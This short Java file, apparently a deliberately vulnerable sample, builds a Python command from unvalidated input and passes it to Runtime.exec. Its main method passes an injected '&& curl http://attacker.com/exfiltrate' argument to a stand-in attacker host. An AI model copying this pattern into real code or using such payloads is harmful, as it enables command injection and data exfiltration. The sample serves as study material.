import java.io.*;

public class vulnerability8 {
    public void runScript(String scriptName, String args) throws IOException {
        String command = "python /scripts/" + scriptName + ".py " + args;
        Process process = Runtime.getRuntime().exec(command);
    }
    
    public static void main(String[] args) throws IOException {
        vulnerability8 v = new vulnerability8();
        v.runScript("data_processor", "input.txt && curl http://attacker.com/exfiltrate");
    }
}